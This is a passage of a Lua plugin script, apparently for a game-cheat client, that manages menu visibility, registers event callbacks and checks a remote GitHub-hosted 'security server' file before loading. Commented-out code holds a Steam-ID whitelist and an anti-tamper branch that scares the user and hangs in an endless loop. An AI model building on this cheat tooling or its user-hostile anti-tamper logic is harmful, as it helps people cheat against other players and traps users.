    -- This must be done prior to processing otherwise the sub items become invisible.
    ui.set( items.state_enabled[ 1 ], true )
    ui.set( items.state_enabled[ 2 ], true )

    -- Create a variable to keep track of how many times we've iterated.
    local iter = 0

    -- Now to handle visibility; most luas check every single item, every single frame,
    -- and this is palpably not a good idea. We can circumvent this by only handling our items
    -- under 2 conditions: when the lua is first loaded, and when the value of one of our
    -- items has changed; we achieve this with entry.initialized and ui.set_callback respectively.
    for _, item in pairs( items ) do
        -- We obviously don't want our master switch visibility set to itself.
        if item == items.master_switch or item == items.master_switch_label then
            goto continue
        end

        -- Ensure our item isn't an array.
        if type( item ) ~= "table" then
            -- The lua has just been loaded, attach a callback to this function
            -- so we re-run it every time the value of this item changes.
            if not entry.initialized then
                ui.set_callback( item, entry.update_visibility )
            end

            -- Same as the master switch, we don't want this to use the visibility of itself.
            if item == items.display_configs then
                ui.set_visible( item, state )
            else
                -- Set the item's visibility in accordance with the master switch.
                ui.set_visible( item, state and not display_configs )
            end
        else
            -- We're dealing with an array, perform the same actions on each member.
            for i=1, #item do
                if not entry.initialized then
                    ui.set_callback( item[ i ], entry.update_visibility )
                end

                ui.set_visible( item[ i ], state and not display_configs )
            end
        end

        ::continue::
        -- Increment our iteration variable.
        iter = iter + 1
    end

    -- If this is our initial load, let the user know where we are.
    if not entry.initialized then
        opulent.print( "Handled ", iter, " menu items" )
    end

    -- Now, time to handle the items that have special visibility checks. We'll start by iterating
    -- over the item with the conditions, the key, and the conditions themselves, the value.
    for item, conditions in pairs( opulent.conditional_items ) do
        -- Again, ensure we aren't dealing with an array.
        if type( item ) ~= "table" then
            -- Iterate over the conditions themselves.
            for i=1, #conditions do
                -- Now compare the current condition value to the true value, the 2nd member of the nested array.
                if ui.get( conditions[ i ][ 1 ] ) ~= conditions[ i ][ 2 ] then
                    -- The required value is not true, set the item's visibility to false and break the loop.
                    ui.set_visible( item, false )
                    break
                end
            end
        else
            -- This item is an array, iterate over the members and perform the same actions.
            for i=1, #item do
                for j=1, #conditions do
                    if ui.get( conditions[ j ][ 1 ] ) ~= conditions[ j ][ 2 ] then
                        ui.set_visible( item[ i ], false )
                        break
                    end
                end
            end
        end
    end

    -- Stop the handling from making the safety triggers visible under the safe state itself.
    ui.set_visible( items.safety_triggers[ 2 ], false )
    ui.set_visible( items.danger_threshold[ 2 ], false )

    -- Finally, tell the lua that we have run all of our initialization code.
    entry.initialized = true
end

entry.initialize = function( )
    -- Utilize an inline conditional here to decide whether we want to attach functions to the event or detach them.
    local set_event_callback = ui.get( items.master_switch ) and client.set_event_callback or client.unset_event_callback

    -- Create a variable to keep track of how many times we've iterated.
    local iter = 0

    -- Iterate over every desired event and it's bound functions.
    for event, functions in pairs( entry.bound_events ) do
        -- Now iterate over the list of associated functions.
        for i=1, #functions do
            set_event_callback( event, functions[ i ] )
            -- Increase our iteration variable.
            iter = iter + 1
        end
    end

    -- If we haven't already run through this, let the user know what we're doing.
    if not entry.initialized then
        opulent.print( "Allocated ", iter, " events" )
    end

    -- Set a special callback for our master switch here so that we return to this function whenever it's value changes.
    -- We want this to occur so that we can reattach/detach our functions from the events depending on our master switch value.
    ui.set_callback( items.master_switch, entry.initialize )
    entry.update_visibility( )
end


-- Clear our console so our updates are clear.
client.exec( "clear" )

-- Notify user of stage.
opulent.print( "Beginning initialization" )

-- local whitelisted_users = {
--     "76561199300217771",
--     "76561198422683513",
--     "76561199505676388",
--     "76561197964556072"
-- }

local db_string = "https://raw.githubusercontent.com/skartagh/opulent_server/main/state"
 http.get( db_string, function( success, response )
--     if db_string:len( ) ~= 68 then
--         scare_user( )
--         while true do
--             print( "I am an idiot" )
--         end
--         return
--     end

--     local failed_to_return = false

--     if not success or response.status ~= 200 then
--         local steam_id64 = panorama.open( ).MyPersonaAPI.GetXuid( )
--         for i=1, #whitelisted_users do
--             if whitelisted_users[ i ] == steam_id64 then
--                 goto continue
--             end
--         end
        
--         error( "Opulent failed to connect to the server [ connected: " .. tostring( success ) .. " | status: " .. tostring( response.status ) .. " ]" )
--         failed_to_return = true
--         return
--     elseif response.body:sub( 1, -2 ) ~= "aSBsb3ZlIHRyZW50IGhvcm4=" then
--         error( "Opulent failed to connect to the server" )
--         failed_to_return = true
--         return
--     end

--     if failed_to_return then
--         return
--     end

--     ::continue::

    opulent.print( "Connected to the security server" )

    -- Initialize events, item visibility, etc.
    entry.initialize( )

    -- Set the event for our label handling, regardless of master switch state.
    client.set_event_callback( "paint_ui", opulent.label_handling )

    client.set_event_callback( "paint_ui", entry.ghetto_fix )

    -- Same for our console input handling.
    client.set_event_callback( "console_input", opulent.console_handling )
    -- Ensure we re-run our visibility handling on unload to reverse any changes we made.
    client.set_event_callback( "shutdown", entry.ghetto_fix )

    -- Finally, tell our user we have successfully loaded the lua.
    opulent.print( "Type 'update log' into console to see the latest updates!" )
    opulent.print( "Opulent has been loaded [ version: beta ]" )
    client.exec( "play ui\\mm_success_lets_roll" )
end )